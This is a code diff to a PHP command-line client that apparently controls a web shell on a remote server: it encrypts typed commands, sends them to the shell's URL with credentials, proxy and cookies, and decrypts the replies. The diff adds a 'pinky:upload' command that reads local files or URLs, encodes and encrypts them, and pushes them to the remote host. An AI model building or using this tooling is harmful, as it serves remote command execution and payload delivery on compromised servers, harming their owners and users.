@@ -108,10 +108,7 @@ do {
         "\r"
     ), '', $line));
     if ($cmd != 'exit' && strlen($cmd) > 0) {
-        $data = array(
-            'c' => encrypt_decrypt('encrypt', base64_encode($cmd), $key, $iv),
-            'p' => base64_encode($path)
-        );
+        $data = make_request($cmd, $path, $key, $iv);
         $result = send_request($url, $data, $login, $password, $proxy, $cookies);
         if ($result['status'] == 200) {
             $decrypted_content = encrypt_decrypt('decrypt', $result['content'], $key, $iv);
@@ -126,6 +123,50 @@ do {
 /*------------------*/
 /*- Core Functions -*/
 /*------------------*/
+
+function make_request($cmd, $path, $key, $iv)
+{
+    $data     = array(
+        'p' => base64_encode($path)
+    );
+    $position = strpos($cmd, 'pinky:');
+    if ($position === false) {
+        $data['c'] = encrypt_decrypt('encrypt', base64_encode($cmd), $key, $iv);
+    } else {
+        $cmd = str_replace('pinky:','', $cmd);
+        $input = explode(' ', $cmd);
+        $action = $input[0];
+        if ($action == 'upload') {
+            array_shift($input);
+            $data['f']      = array(); // files
+            $data['f']['u'] = array(); // urls
+            $data['f']['b'] = array(); // binaries
+            foreach ($input as $entry) {
+                if (filter_var($entry, FILTER_VALIDATE_URL)) {
+                    $parsed = parse_url($entry);
+                    $name = base64_encode(basename($parsed['path']));
+                    $url = base64_encode($entry);
+                    $array = array(
+                            'n'=> encrypt_decrypt('encrypt', $name, $key, $iv),
+                            'p'=> encrypt_decrypt('encrypt', $url, $key, $iv)
+                    );
+                    array_push($data['f']['u'], $array);
+                } else {
+                    $file = file_to_base64($entry);
+                    if (!is_null($file)) {
+                        $name = base64_encode(basename(realpath($entry)));
+                        $array = array(
+                            'n'=> encrypt_decrypt('encrypt', $name, $key, $iv),
+                            'p'=> encrypt_decrypt('encrypt', $file, $key, $iv)
+                        );
+                        array_push($data['f']['b'], $array);
+                    }
+                }
+            }
+        }
+    }
+    return $data;
+}
 
 function send_request($url, $data, $login, $password, $proxy = array(), $cookies = null)
 {
@@ -181,6 +222,7 @@ function send_request($url, $data, $login, $password, $proxy = array(), $cookies
 
     $info = curl_getinfo($ch);
     curl_close($ch);
+
     return array(
         'status' => $info['http_code'],
         'content' => $result
@@ -220,6 +262,14 @@ function is_json_valid($config)
     }
 
     return true;
+}
+
+function file_to_base64($file)
+{
+    if(file_exists($file)){
+        return base64_encode(file_get_contents($file));
+    }
+    return null;
 }
 
 function print_banner()
@@ -630,7 +680,7 @@ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'               `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 $$$$$$$$$$$$$$$$$$$$$$$$$$$$'                   `$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 $$$'`$$$$$$$$$$$$$'`$$$$$$!                       !$$$$$$'`$$$$$$$$$$$$$'`$$$
 $$$$  $$$$$$$$$$$  $$$$$$$                         $$$$$$$  $$$$$$$$$$$  $$$$
-$$$$. `$' \' \$`  $$$$$$$!                         !$$$$$$$  '$/ `/ `$' .$$$$
+$$$$. `$' \' \$`  $$$$$$$!                          !$$$$$$$  '$/ `/ `$' .$$$$
 $$$$$. !\  i  i .$$$$$$$$                           $$$$$$$$. i  i  /! .$$$$$
 $$$$$$   `--`--.$$$$$$$$$                           $$$$$$$$$.--'--'   $$$$$$
 $$$$$\$L        `$$$$$^^$$                           $$^^$$$$$'        J$$$$$$
